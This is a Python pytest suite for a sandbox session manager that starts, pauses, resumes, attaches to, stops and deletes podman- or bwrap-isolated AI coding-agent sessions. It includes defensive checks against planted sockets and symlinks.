"""Happy/sad/edge contracts for named sessions; only process boundaries are mocked."""
import importlib.util
import json
import os
from pathlib import Path
import re
import signal
import subprocess
from unittest.mock import Mock

import pytest

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("sandbox_sessions_test", ROOT / "sandbox/sessions.py")
m = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(m)


@pytest.fixture(params=["happy", "sad", "edge"])
def scenario(request):
    return request.param


@pytest.fixture(autouse=True)
def isolated(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    monkeypatch.setattr(m, "PROC", tmp_path / "proc")
    (tmp_path / "proc").mkdir()
    monkeypatch.setattr(m.sys.stdin, "isatty", lambda: False)
    # A terminal that comes back from a session waits for nothing in these tests.
    monkeypatch.setattr(m, "DETACH_GRACE", 0)
    monkeypatch.setattr(m, "ENDING_WAIT", 0)


def fake_process(tmp_path, pid, ppid, cmdline=b"python3\0", comm="python3", start=None):
    entry = tmp_path / "proc" / str(pid)
    entry.mkdir()
    (entry / "cmdline").write_bytes(cmdline)
    # The start time is field 22; without one the stat line ends early, as in the older fixtures.
    tail = " 0" * 13 + f" {start}" if start is not None else ""
    (entry / "stat").write_text(f"{pid} ({comm}) S {ppid} 1 1 0 -1{tail}\n")


def make_session(name, backend="podman", pid=None, tmp_path=None, paused=False):
    directory = m.session_dir(name)
    for path in (directory, directory / "home", directory / "tmux"):
        path.mkdir(parents=True, exist_ok=True)
    data = {"agent": "codex", "options": ["--workspace", "/srv/w", "--backend", backend], "agent_args": [],
            "backend": backend, "workspace": "/srv/w", "cwd": "/", "created": "2026-10-31T00:00:00Z",
            "pod": f"agent-session-{name}"}
    if pid:
        data["pid"] = pid
        fake_process(tmp_path, pid, 1, b"python3\0agent_sandbox.py\0--tmux-socket-dir\0"
                     + os.fsencode(str(directory / "tmux")) + b"\0")
    if paused:
        (directory / "paused").touch()
    m.save(name, data)
    return data


def test_split_argv(scenario):
    argv = {"happy": ["codex", "--workspace", "/w", "--session", "s1", "--", "exec", "task"],
            "sad": ["codex", "--session", "s1"],
            "edge": ["codex", "--session=s1", "--gui", "--", "--session", "literal"]}[scenario]
    expected = {"happy": (["--workspace", "/w"], ["exec", "task"]), "sad": ([], []),
                "edge": (["--gui"], ["--session", "literal"])}[scenario]
    assert m.split_argv(argv) == expected


def test_start_new_session_launches_detached_supervisor(tmp_path, monkeypatch):
    launched = {}
    def popen(cmd, **kwargs):
        launched.update(cmd=cmd, **kwargs)
        (m.session_dir("demo") / "tmux" / "attach.sock").touch()
        fake_process(tmp_path, 4242, 1, start=987654)
        return Mock(pid=4242, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    monkeypatch.setattr(m, "clear_stale_pod", Mock())
    monkeypatch.chdir(tmp_path)
    a = m.launcher().parse_args(["codex", "--workspace", "/srv/w", "--session", "demo"])
    assert m.start(a, ["codex", "--workspace", "/srv/w", "--session", "demo", "--", "exec", "x"]) == 0
    directory = m.session_dir("demo")
    cmd = launched["cmd"]
    assert cmd[cmd.index("--state-dir") + 1] == str(directory / "home")
    assert cmd[cmd.index("--tmux-socket-dir") + 1] == str(directory / "tmux")
    # Every run of a session has a run id (and pod) of its own; session.json says which is current.
    pod = cmd[cmd.index("--pod-name") + 1]
    assert re.fullmatch(r"agent-codex-[0-9a-f]{8}", pod) and m.load("demo")["run"] == pod[len("agent-"):]
    assert cmd[cmd.index("--") + 1:] == ["exec", "x"]
    assert "--session" not in cmd
    assert launched["start_new_session"] is True and launched["cwd"] == str(tmp_path)
    assert launched["stdin"] == subprocess.DEVNULL
    data = m.load("demo")
    assert data["pid"] == 4242 and data["pid_start"] == 987654 and data["agent_args"] == ["exec", "x"]
    for path in (directory, directory / "home", directory / "tmux"):
        assert path.stat().st_mode & 0o777 == 0o700


def test_start_refuses_running_and_resumes_stopped(scenario, tmp_path, monkeypatch):
    if scenario == "sad":
        make_session("busy", pid=77, tmp_path=tmp_path)
        a = m.launcher().parse_args(["codex", "--session", "busy"])
        with pytest.raises(ValueError, match="attach with: sandbox-ai attach busy"):
            m.start(a, ["codex", "--session", "busy"])
    elif scenario == "edge":
        make_session("other")
        a = m.launcher().parse_args(["claude", "--session", "other"])
        with pytest.raises(ValueError, match="belongs to codex"):
            m.start(a, ["claude", "--session", "other"])
    else:
        make_session("old")
        launch = Mock(return_value=0)
        monkeypatch.setattr(m, "launch", launch)
        a = m.launcher().parse_args(["codex", "--session", "old", "--gui"])
        assert m.start(a, ["codex", "--session", "old", "--gui"]) == 0
        name, data, agent_args, merged = launch.call_args.args
        assert agent_args == ["resume", "--last"] and merged is a
        assert data["options"] == ["--workspace", "/srv/w", "--backend", "podman"]


def test_start_warns_when_options_of_a_stopped_session_are_ignored(scenario, monkeypatch, capsys):
    make_session("old")
    monkeypatch.setattr(m, "launch", Mock(return_value=0))
    argv = {"happy": ["codex", "--workspace", "/srv/w", "--backend", "podman", "--session", "old"],
            "sad": ["codex", "--session", "old", "--allow-github"],
            "edge": ["codex", "--workspace", "/srv/w", "--backend", "podman", "--session", "old", "--", "exec", "x"]}[scenario]
    assert m.start(m.launcher().parse_args(argv), argv) == 0
    err = capsys.readouterr().err
    if scenario == "happy":
        # The same options as saved, or none at all: nothing is lost, so no warning.
        assert "warning" not in err
        assert m.start(m.launcher().parse_args(["codex", "--session", "old"]), ["codex", "--session", "old"]) == 0
        assert "warning" not in capsys.readouterr().err
    else:
        ignored = "--allow-github" if scenario == "sad" else "-- exec x"
        assert "warning" in err and f"ignored now: {ignored}" in err
        assert "--workspace /srv/w --backend podman" in err
    assert m.launch.call_args.args[2] == ["resume", "--last"]


def test_clear_stale_pod(scenario, tmp_path, monkeypatch, capsys):
    data = make_session("s", backend="bwrap" if scenario == "edge" else "podman")
    own = str((m.session_dir("s") / "tmux").resolve())
    labels = {"happy": {m.launcher().SESSION_LABEL: own}, "sad": {m.launcher().SESSION_LABEL: "/elsewhere/tmux"},
              "edge": {}}[scenario]
    calls = []

    def run(cmd, **kwargs):
        calls.append(cmd)
        if cmd[1:3] == ["pod", "inspect"]:
            return Mock(returncode=0, stdout=json.dumps(labels) + "\n")
        return Mock(returncode=0)
    monkeypatch.setattr(m.subprocess, "run", run)
    if scenario == "happy":
        m.clear_stale_pod("s", data)
        assert calls[-1] == ["podman", "pod", "rm", "--force", "agent-session-s"]
        assert "left behind" in capsys.readouterr().err
    elif scenario == "sad":
        # A pod of the same name from another state directory may be in use: never removed.
        with pytest.raises(ValueError, match="podman pod rm --force agent-session-s"):
            m.clear_stale_pod("s", data)
        assert all(cmd[1:3] != ["pod", "rm"] for cmd in calls)
    else:
        m.clear_stale_pod("s", data)
        assert calls == []  # bwrap has no pod


def test_clear_stale_pod_without_pod_or_podman(scenario, monkeypatch):
    data = make_session("s")
    if scenario == "happy":
        monkeypatch.setattr(m.subprocess, "run", Mock(return_value=Mock(returncode=125, stdout="")))
    elif scenario == "sad":
        monkeypatch.setattr(m.subprocess, "run", Mock(side_effect=FileNotFoundError("podman")))
    else:
        # A pod without labels (created before labelling) is not removed automatically.
        monkeypatch.setattr(m.subprocess, "run", Mock(return_value=Mock(returncode=0, stdout="null\n")))
        with pytest.raises(ValueError, match="not created here"):
            m.clear_stale_pod("s", data)
        return
    m.clear_stale_pod("s", data)
    assert m.subprocess.run.call_count == 1


def test_launch_clears_stale_pod_first(tmp_path, monkeypatch):
    data = make_session("s")
    order = []
    monkeypatch.setattr(m, "clear_stale_pod", lambda name, d: order.append("clear"))
    def popen(cmd, **kwargs):
        order.append("popen")
        (m.session_dir("s") / "tmux" / "attach.sock").touch()
        return Mock(pid=4243, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    assert m.launch("s", data, ["resume", "--last"]) == 0
    assert order == ["clear", "popen"]


def test_wait_ready(scenario, tmp_path):
    directory = tmp_path / "s"
    (directory / "tmux" / "tmux-0").mkdir(parents=True)
    (directory / "supervisor.log").write_text("boom: image missing\n")
    if scenario == "happy":
        (directory / "tmux" / "attach.sock").touch()
        m.wait_ready(directory, Mock(poll=Mock(return_value=None)))
    elif scenario == "sad":
        with pytest.raises(RuntimeError, match="image missing"):
            m.wait_ready(directory, Mock(poll=Mock(return_value=1), returncode=1))
    else:
        with pytest.raises(RuntimeError, match="within 0"):
            m.wait_ready(directory, Mock(poll=Mock(return_value=None)), timeout=0)


def test_status(scenario, tmp_path):
    if scenario == "happy":
        assert m.status("a", make_session("a", pid=10, tmp_path=tmp_path)) == "running"
        assert m.status("b", make_session("b", pid=11, tmp_path=tmp_path, paused=True)) == "paused"
    elif scenario == "sad":
        assert m.status("c", make_session("c")) == "stopped"
        assert m.status("d", {**make_session("d"), "pid": 999}) == "stopped"
    else:
        # A reused PID that runs something else is not the session.
        fake_process(tmp_path, 12, 1, b"vim\0")
        assert m.status("e", {**make_session("e"), "pid": 12}) == "stopped"


def test_status_compares_the_start_time(scenario, tmp_path):
    data = make_session("s")
    fake_process(tmp_path, 20, 1, b"python3\0--tmux-socket-dir\0" + os.fsencode(str(m.session_dir("s") / "tmux"))
                 + b"\0", start=5000)
    if scenario == "happy":
        assert m.status("s", {**data, "pid": 20, "pid_start": 5000}) == "running"
    elif scenario == "sad":
        # Same PID and command line, other start time: a later process (another run of this launcher).
        assert m.status("s", {**data, "pid": 20, "pid_start": 4999}) == "stopped"
    else:
        # Written by an older version without a start time: the command line decides, as before.
        assert m.status("s", {**data, "pid": 20}) == "running"


def test_descendants_and_signal_tree(scenario, tmp_path, monkeypatch):
    fake_process(tmp_path, 100, 1)
    fake_process(tmp_path, 101, 100, comm="bwrap")
    fake_process(tmp_path, 102, 101, comm="odd) name (x")
    fake_process(tmp_path, 103, 102)
    fake_process(tmp_path, 200, 1)
    if scenario == "sad":
        assert m.descendants(200) == []
        return
    assert m.descendants(100) == [101, 102, 103]
    sent = []
    def kill(pid, sig):
        if pid == 103 and scenario == "edge":
            raise ProcessLookupError
        sent.append((pid, sig))
    monkeypatch.setattr(m.os, "kill", kill)
    m.signal_tree(100, signal.SIGSTOP if scenario == "happy" else signal.SIGCONT)
    if scenario == "happy":
        assert sent == [(p, signal.SIGSTOP) for p in (100, 101, 102, 103)] * 2
    else:
        assert sent == [(p, signal.SIGCONT) for p in (100, 101, 102)]


@pytest.mark.parametrize("backend", ["podman", "bwrap"])
def test_pause_and_resume(backend, tmp_path, monkeypatch):
    make_session("p", backend=backend, pid=50, tmp_path=tmp_path)
    run, tree = Mock(), Mock()
    monkeypatch.setattr(m.subprocess, "run", run)
    monkeypatch.setattr(m, "signal_tree", tree)
    assert m.pause("p") == 0
    assert m.status("p", m.load("p")) == "paused"
    with pytest.raises(ValueError, match="paused"):
        m.pause("p")
    assert m.resume("p") == 0
    assert m.status("p", m.load("p")) == "running"
    if backend == "podman":
        assert [c.args[0][-3:] for c in run.call_args_list] == [["pod", "pause", "agent-session-p"],
                                                                ["pod", "unpause", "agent-session-p"]]
        tree.assert_not_called()
    else:
        assert [c.args for c in tree.call_args_list] == [(50, signal.SIGSTOP), (50, signal.SIGCONT)]
        run.assert_not_called()


def test_resume_stopped_session_restarts_with_continue(tmp_path, monkeypatch):
    make_session("s")
    launch = Mock(return_value=0)
    monkeypatch.setattr(m, "launch", launch)
    assert m.resume("s") == 0
    assert launch.call_args.args[2] == ["resume", "--last"]


def test_restart_args(scenario):
    data = {"agent": "claude", "options": [], "agent_args": ["-p", "task"]}
    if scenario == "happy":
        assert m.restart_args(data) == ["--continue"]
    elif scenario == "sad":
        assert m.restart_args({**data, "options": ["--binary", "/usr/bin/python3"]}) == ["-p", "task"]
    else:
        assert m.restart_args({**data, "options": ["--binary=/opt/tool"]}) == ["-p", "task"]


def test_stop(scenario, tmp_path, monkeypatch):
    data = make_session("x", pid=60, tmp_path=tmp_path, paused=scenario == "edge")
    kills, run = [], Mock()
    monkeypatch.setattr(m.subprocess, "run", run)
    monkeypatch.setattr(m.time, "sleep", lambda _: None)
    # status() asks once, then the wait loop and the final check.
    states = iter([True, False, False]) if scenario != "sad" else iter([])
    monkeypatch.setattr(m, "alive", lambda name, data: next(states, True))
    monkeypatch.setattr(m, "thaw", Mock())
    def kill(pid, sig):
        kills.append(sig)
    monkeypatch.setattr(m.os, "kill", kill)
    if scenario == "sad":
        assert m.stop("x", timeout=0) == 0
        assert kills == [signal.SIGTERM, signal.SIGKILL]
        # Only the session's own, labelled pod is removed: inspect first, then rm.
        own = json.dumps({m.launcher().SESSION_LABEL: str((m.session_dir("x") / "tmux").resolve())})
        run.return_value = Mock(returncode=0, stdout=own)
        run.reset_mock()
        states = iter([True])
        kills.clear()
        assert m.stop("x", timeout=0) == 0
        assert run.call_args_list[0].args[0][1:3] == ["pod", "inspect"]
        assert run.call_args.args[0][-4:] == ["pod", "rm", "--force", "agent-session-x"]
    else:
        assert m.stop("x") == 0
        assert kills == [signal.SIGTERM]
        assert m.thaw.called == (scenario == "edge")
    assert (m.session_dir("x") / "home").is_dir()


def test_attach(scenario, tmp_path, monkeypatch):
    call = Mock(return_value=0)
    monkeypatch.setattr(m.subprocess, "call", call)
    monkeypatch.setenv("TMUX", "/tmp/outer,1,0")
    if scenario == "sad":
        make_session("z", pid=70, tmp_path=tmp_path, paused=True)
        with pytest.raises(ValueError, match="paused"):
            m.attach("z")
        return
    backend = "podman" if scenario == "happy" else "bwrap"
    make_session("z", backend=backend, pid=71, tmp_path=tmp_path)
    client = Mock(return_value=0)
    monkeypatch.setattr(m.launcher(), "attach_client", client)
    assert m.attach("z") == 0
    # Never a tmux client or podman exec on the host side: only the byte relay.
    call.assert_not_called()
    assert client.call_args.args[0] == str(m.session_dir("z") / "tmux" / "attach.sock")


def test_delete(scenario, tmp_path):
    if scenario == "sad":
        make_session("d", pid=80, tmp_path=tmp_path)
        with pytest.raises(ValueError, match="Stop session"):
            m.delete("d", yes=True)
    elif scenario == "edge":
        make_session("d")
        with pytest.raises(ValueError, match="--yes"):
            m.delete("d")
        assert m.session_dir("d").exists()
    else:
        make_session("d")
        assert m.delete("d", yes=True) == 0
        assert not m.session_dir("d").exists()


def test_session_name_validation(scenario):
    if scenario == "sad":
        # An id is a name, perhaps with a -xxxx suffix (sessions.new_key): at most 48 characters.
        for name in ("../x", "a b", "", "x" * 49, ".hidden", None):
            with pytest.raises(ValueError):
                m.session_dir(name)
    else:
        name = "demo" if scenario == "happy" else "A.b_c-1"
        assert m.session_dir(name).name == name


def test_list_and_cli(tmp_path, capsys):
    make_session("one")
    make_session("two", pid=90, tmp_path=tmp_path)
    assert m.cli(["list"]) == 0
    lines = capsys.readouterr().out.splitlines()
    assert lines[0].split() == ["NAME", "AGENT", "BACKEND", "STATUS", "CREATED", "WORKSPACE"]
    assert lines[1].split()[:4] == ["one", "codex", "podman", "stopped"]
    assert lines[2].split()[:4] == ["two", "codex", "podman", "running"]
    with pytest.raises(SystemExit):
        m.cli(["frobnicate", "x"])


def test_wrapper_script_runs_isolated(tmp_path):
    env = {**os.environ, "XDG_STATE_HOME": str(tmp_path / "empty")}
    result = subprocess.run([str(ROOT / "sandbox-session"), "list"], capture_output=True, text=True, env=env)
    assert result.returncode == 0, result.stderr
    assert result.stdout.startswith("no sessions; start one with: sandbox-ai AGENT --session NAME")
    result = subprocess.run([str(ROOT / "sandbox-session"), "attach", "missing"], capture_output=True, text=True, env=env)
    assert result.returncode == 1 and "No session named missing" in result.stderr


def trusted_project(tmp_path, document):
    project = tmp_path / "proj"
    project.mkdir()
    path = project / ".sandbox-ai.json"
    path.write_text(json.dumps({"version": 1, "agent": "codex", **document}))
    m.launcher().trust_config(path)
    return project


def test_project_agent_args_reach_sessions(scenario, tmp_path, monkeypatch):
    """Review finding: the project file's agent_args were dropped because the supervisor always got "--"."""
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    project = trusted_project(tmp_path, {"agent_args": {"happy": ["--sandbox", "read-only"], "sad": ["exec", "x"],
                                                        "edge": ["--sandbox", "read-only"]}[scenario],
                                         "options": ["--backend", "bwrap"]})
    data = make_session("s", backend="podman")
    data.update(options=["--workspace", str(project)], cwd=str(project), workspace=str(project))
    if scenario == "edge":
        data["ready"] = False  # the first start never came up
    m.save("s", data)
    a, document = m.effective(data)
    # The project file's --backend is what the launcher uses, so pause/stop must use it too.
    assert a.backend == "bwrap" and document["agent_args"]
    args = m.restart_args(data, document["agent_args"])
    expected = {"happy": ["--sandbox", "read-only", "resume", "--last"], "sad": ["resume", "--last"],
                "edge": []}[scenario]
    assert args == expected
    captured = {}
    monkeypatch.setattr(m, "clear_stale_pod", Mock())
    def popen(cmd, **kwargs):
        captured["cmd"] = cmd
        (m.session_dir("s") / "tmux" / "attach.sock").touch()
        return Mock(pid=4244, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    assert m.launch("s", data, [], a) == 0
    # No "--" without agent arguments: the launcher then applies the project file's agent_args.
    assert "--" not in captured["cmd"]
    saved = m.load("s")
    assert saved["backend"] == "bwrap" and saved["ready"] is True


def test_launch_recreates_socket_directory(scenario, tmp_path, monkeypatch):
    """Review finding: the agent could block restarts with a directory named attach.sock or a chmod of HOME."""
    data = make_session("r")
    tmux, home = m.session_dir("r") / "tmux", m.session_dir("r") / "home"
    if scenario == "happy":
        (tmux / "attach.sock").mkdir()
        (tmux / "attach.sock" / "x").write_text("")
    elif scenario == "sad":
        home.chmod(0o755)
    else:
        (tmux / "attach.sock").symlink_to(tmp_path)
    monkeypatch.setattr(m, "clear_stale_pod", Mock())
    seen = {}
    def popen(cmd, **kwargs):
        seen["entries"] = sorted(p.name for p in tmux.iterdir())
        (tmux / "attach.sock").touch()
        return Mock(pid=4245, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    assert m.launch("r", data, ["resume", "--last"], m.SimpleNamespace(backend="podman", podman_url=None)) == 0
    assert seen["entries"] == []
    assert tmux.stat().st_mode & 0o777 == 0o700 and home.stat().st_mode & 0o777 == 0o700
    assert tmp_path.is_dir()


def test_descendants_skip_mcp_supervisors(scenario, tmp_path):
    """Review finding: pausing a bwrap session froze MCP servers that other agents use."""
    fake_process(tmp_path, 10, 1)
    fake_process(tmp_path, 11, 10)
    mcp_cmd = b"python3\0agent_sandbox.py\0codex\0--mcp-socket-dir\0/s\0"
    fake_process(tmp_path, 12, 10, mcp_cmd if scenario != "sad" else b"python3\0")
    fake_process(tmp_path, 13, 12)
    expected = {"happy": [11], "sad": [11, 12, 13], "edge": [11]}[scenario]
    assert m.descendants(10) == expected


def test_rows_survive_damaged_sessions(scenario, tmp_path):
    make_session("good")
    bad = m.root() / "bad"
    bad.mkdir()
    if scenario == "happy":
        (bad / "session.json").write_text("{not json")
    elif scenario == "sad":
        (bad / "session.json").write_text(json.dumps({"agent": "codex"}))
    rows = m.rows()
    assert rows[-1][0] == "good"
    if scenario == "edge":
        assert [r[0] for r in rows] == ["good"]
    else:
        assert rows[0] == ["bad", "?", "?", "damaged", "-", "-"]


def test_delete_removes_read_only_trees(scenario, tmp_path):
    make_session("d")
    cache = m.session_dir("d") / "home" / ("go/pkg/mod" if scenario != "edge" else "x")
    cache.mkdir(parents=True)
    (cache / "file").write_text("")
    if scenario != "sad":
        cache.chmod(0o500)
        m.session_dir("d").joinpath("home").chmod(0o500 if scenario == "edge" else 0o700)
    assert m.delete("d", yes=True) == 0
    assert not m.session_dir("d").exists()


def test_session_lock(scenario, tmp_path, monkeypatch):
    """Review finding: two concurrent resumes could both see "stopped" and launch twice."""
    import fcntl
    if scenario == "sad":
        with pytest.raises(ValueError, match="No session named"):
            with m.session_lock("ghost"):
                pass
        assert not m.session_dir("ghost").exists()
        return
    make_session("l")
    held = os.open(m.session_dir("l") / ".lock", os.O_RDWR | os.O_CREAT)
    try:
        fcntl.flock(held, fcntl.LOCK_EX)
        if scenario == "happy":
            for command in (lambda: m.resume("l"), lambda: m.stop("l"), lambda: m.pause("l"),
                            lambda: m.delete("l", yes=True)):
                with pytest.raises(ValueError, match="another command"):
                    command()
        else:
            fcntl.flock(held, fcntl.LOCK_UN)
            monkeypatch.setattr(m, "launch", Mock(return_value=0))
            monkeypatch.setattr(m, "attach", Mock(side_effect=AssertionError("attach while locked")))
            monkeypatch.setattr(m.sys.stdin, "isatty", lambda: True)
            monkeypatch.setattr(m.sys.stdout, "isatty", lambda: True)
            locked_during_attach = []
            def attach(name):
                # The lock must be free while the terminal is attached.
                probe = os.open(m.session_dir("l") / ".lock", os.O_RDWR)
                try:
                    fcntl.flock(probe, fcntl.LOCK_EX | fcntl.LOCK_NB)
                    locked_during_attach.append(False)
                finally:
                    os.close(probe)
                return 0
            monkeypatch.setattr(m, "attach", attach)
            assert m.resume("l") == 0
            assert locked_during_attach == [False]
    finally:
        os.close(held)


def test_restart_keeps_agent_options(scenario):
    data = {"agent": "claude", "options": [], "agent_args": {"happy": ["--model", "sonnet"],
                                                             "sad": ["--model", "sonnet", "-p", "task"],
                                                             "edge": []}[scenario]}
    expected = {"happy": ["--model", "sonnet", "--continue"], "sad": ["--continue"],
                "edge": ["--add-dir", "/workspaces/lib", "--continue"]}[scenario]
    assert m.restart_args(data, ["--add-dir", "/workspaces/lib"]) == expected
    # --binary from the project file repeats the arguments instead of continuing.
    assert m.restart_args({**data, "agent_args": []}, ["-I", "x.py"], binary=True) == ["-I", "x.py"]


@pytest.mark.parametrize("agent,args,expected", [
    ("claude", ["--model", "opus", "fix the failing tests"], ["--model", "opus", "--continue"]),
    ("codex", ["--model", "o3", "implement X"], ["--model", "o3", "resume", "--last"]),
    ("claude", ["--resume", "abc"], ["--continue"]),
    ("claude", ["--verbose", "do it"], ["--continue"]),
    ("codex", ["-p", "work", "--sandbox", "read-only"], ["-p", "work", "--sandbox", "read-only", "resume", "--last"]),
    ("codex", ["exec", "task"], ["resume", "--last"]),
    ("opencode", ["--model=x/y", "run", "go"], ["--continue"]),
    ("claude", ["--add-dir", "/w", "--unknown", "value"], ["--add-dir", "/w", "--continue"]),
])
def test_review_restart_never_repeats_prompts(agent, args, expected):
    """Review finding: options were kept together with the prompt that followed them."""
    assert m.restart_args({"agent": agent, "options": [], "agent_args": args}) == expected


def test_failed_first_start_leaves_no_directory(scenario, tmp_path, monkeypatch):
    def fail(a, argv, key=None):
        if scenario != "sad":
            raise ValueError("image missing")
        m.save("x", {"agent": "codex"})  # saved before failing: kept as a stopped session
        raise ValueError("timeout")
    monkeypatch.setattr(m, "start_locked", fail)
    a = m.launcher().parse_args(["codex", "--session", "x"])
    if scenario == "edge":
        m.session_dir("x").mkdir(parents=True)  # existed before: never removed
    with pytest.raises(ValueError):
        m.start(a, ["codex", "--session", "x"])
    assert m.session_dir("x").exists() == (scenario != "happy")


# --- every interactive start is a session --------------------------------------------------------------------


def test_split_argv_drops_the_naming_options(scenario):
    argv = {"happy": ["claude", "--name", "review", "--gui", "--project-name=shop"],
            "sad": ["claude", "--name=x", "--session", "y"],
            "edge": ["claude", "--gui", "--", "--name", "literal"]}[scenario]
    expected = {"happy": (["--gui"], []), "sad": ([], []), "edge": (["--gui"], ["--name", "literal"])}[scenario]
    assert m.split_argv(argv) == expected


def test_start_of_an_interactive_start(scenario, tmp_path, monkeypatch):
    """Not --session: a new session under the start's name; without a kept HOME no home/ and no --state-dir."""
    launched = {}

    def popen(cmd, **kwargs):
        launched["cmd"] = cmd
        key = cmd[cmd.index("--start-id") + 1]
        (m.session_dir(key) / "tmux" / "attach.sock").touch()
        return Mock(pid=4250, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    monkeypatch.setattr(m, "clear_stale_pod", Mock())
    monkeypatch.chdir(tmp_path)
    argv = ["claude", "--workspace", "/srv/shop", "--name", "review"]
    a = m.launcher().parse_args(argv)
    a.start_name, a.keep_home = "review", scenario == "edge"
    if scenario == "sad":
        stopped_session("review", name="other")  # a renamed session holds the directory: another id is chosen
    assert m.start(a, argv) == 0
    key = launched["cmd"][launched["cmd"].index("--start-id") + 1]
    data = m.load(key)
    assert data["name"] == "review" and data["mode"] == "tmux" and "--name" not in data["options"]
    assert data["keep"] is (scenario == "edge")
    assert ("--state-dir" in launched["cmd"]) is (scenario == "edge")
    assert (m.session_dir(key) / "home").is_dir() is (scenario == "edge")
    if scenario == "sad":
        assert key.startswith("review-") and len(key) == len("review-") + 4
    else:
        assert key == "review"
    assert [e["event"] for e in m.starts().history("review")] == ["start"]


def stopped_session(key, **fields):
    """A stopped session KEY with FIELDS."""
    name = key
    directory = m.session_dir(name)
    for path in (directory, directory / "tmux"):
        path.mkdir(parents=True, exist_ok=True)
    data = {"agent": "codex", "options": [], "agent_args": [], "backend": "podman", "workspace": "/srv/w", "cwd": "/",
            "created": "2026-11-01T00:00:00Z", "pod": f"agent-session-{name}", **fields}
    m.save(name, data)
    return data


def test_start_refuses_a_name_taken_meanwhile(tmp_path, monkeypatch):
    a = m.launcher().parse_args(["claude"])
    a.start_name = "busy"
    stopped_session("busy")
    monkeypatch.setattr(m, "new_key", lambda name: name)  # as if the directory came after the key was chosen
    with pytest.raises(ValueError, match="was taken meanwhile"):
        m.start(a, ["claude"])


def test_keeps_home(scenario):
    if scenario == "happy":
        assert m.keeps_home({"keep": True})
    elif scenario == "sad":
        assert not m.keeps_home({"keep": False})
    else:
        assert m.keeps_home({})  # sessions of older versions always kept their HOME


def test_relay_listening(scenario, tmp_path):
    import socket
    path = tmp_path / "attach.sock"
    if scenario == "happy":
        server = socket.socket(socket.AF_UNIX)
        server.bind(str(path))
        server.listen(1)
        try:
            assert m.relay_listening(path) is True
        finally:
            server.close()
        assert m.relay_listening(path) is False  # the socket file stays, nobody listens
    elif scenario == "sad":
        assert m.relay_listening(path) is False
        path.write_text("")
        assert m.relay_listening(path) is False  # not a socket
    else:
        server = socket.socket(socket.AF_UNIX)
        server.bind(str(tmp_path / "real.sock"))
        server.listen(1)
        path.symlink_to(tmp_path / "real.sock")  # planted by the sandbox: never followed
        try:
            assert m.relay_listening(path) is False
        finally:
            server.close()


def test_exit_status(scenario):
    data = stopped_session("e", run="claude-1")
    path = m.session_dir("e") / "exit.json"
    if scenario == "happy":
        path.write_text(json.dumps({"run": "claude-1", "status": 3}))
        assert m.exit_status("e", data) == 3
    elif scenario == "sad":
        assert m.exit_status("e", data) is None
        path.write_text(json.dumps({"run": "claude-0", "status": 3}))  # an earlier run's
        assert m.exit_status("e", data) is None
    else:
        path.write_text(json.dumps({"run": "claude-1", "status": True}))
        assert m.exit_status("e", data) is None


def test_prune(scenario, tmp_path):
    if scenario == "happy":
        stopped_session("gone", keep=False)
        assert m.prune("gone") is True and not m.session_dir("gone").exists()
        assert m.prune("gone") is False
    elif scenario == "sad":
        stopped_session("kept", keep=True)
        assert m.prune("kept") is False and m.session_dir("kept").exists()
    else:
        directory = m.session_dir("live")
        (directory / "tmux").mkdir(parents=True)
        fake_process(tmp_path, 300, 1, b"python3\0--tmux-socket-dir\0" + os.fsencode(str(directory / "tmux")) + b"\0")
        m.save("live", {"agent": "codex", "options": [], "keep": False, "pid": 300})
        assert m.prune("live") is False  # still running


def test_after_attach(scenario, tmp_path, monkeypatch, capsys):
    data = stopped_session("t", keep=False, run="claude-1", pid=310)
    if scenario == "happy":
        # Ctrl-b d: the sandbox runs on, its relay listens.
        monkeypatch.setattr(m, "alive", lambda name, d: True)
        monkeypatch.setattr(m, "relay_listening", lambda path: True)
        assert m.after_attach("t") == 0
        assert "detached from t; it keeps running. Back: sandbox-ai attach t" in capsys.readouterr().err
        assert m.session_dir("t").exists()
    elif scenario == "sad":
        # The agent ended: its status; a session without a kept HOME goes, its history stays.
        (m.session_dir("t") / "exit.json").write_text(json.dumps({"run": "claude-1", "status": 7}))
        assert m.after_attach("t") == 7
        assert not m.session_dir("t").exists()
    else:
        # Ended, but the supervisor still cleans up after ENDING_WAIT.
        monkeypatch.setattr(m, "alive", lambda name, d: True)
        monkeypatch.setattr(m, "relay_listening", lambda path: False)
        assert m.after_attach("t") == 0
        assert "still cleaning up" in capsys.readouterr().err


def test_resume_refuses_an_ended_start_without_home(tmp_path):
    stopped_session("gone", keep=False)
    with pytest.raises(ValueError, match="has ended and its HOME was discarded"):
        m.resume("gone")
    assert not m.session_dir("gone").exists()


def test_signal_tree_can_spare_the_root(tmp_path, monkeypatch):
    fake_process(tmp_path, 400, 1)
    fake_process(tmp_path, 401, 400)
    sent = []
    monkeypatch.setattr(m.os, "kill", lambda pid, sig: sent.append(pid))
    m.signal_tree(400, signal.SIGCONT, include_root=False)
    assert sent == [401]


# --- kept starts in the foreground (tasks) -------------------------------------------------------------------


def foreground_args(tmp_path, name="task"):
    a = m.launcher().parse_args(["codex", "--workspace", "/srv/app", "--name", name, "--no-tmux", "--", "exec", "x"])
    a.start_name, a.start_key, a.run_id = name, name, "codex-1a2b3c4d"
    return a


def test_begin(scenario, tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    a = foreground_args(tmp_path)
    argv = ["codex", "--workspace", "/srv/app", "--name", "task", "--no-tmux", "--keep", "--", "exec", "x"]
    if scenario == "sad":
        stopped_session("task")
        with pytest.raises(ValueError, match="was taken meanwhile"):
            m.begin(a, argv)
        return
    if scenario == "edge":
        a.backend = "bwrap"
    m.begin(a, argv)
    data = m.load("task")
    assert data["mode"] == "foreground" and data["keep"] is True and data["pid"] == os.getpid()
    assert data["options"] == ["--workspace", "/srv/app", "--no-tmux"] and data["agent_args"] == ["exec", "x"]
    assert data["run"] == "codex-1a2b3c4d" and data["name"] == "task" and data["ready"] is True
    assert data["pod"] == ("agent-codex-1a2b3c4d" if scenario == "happy" else None)
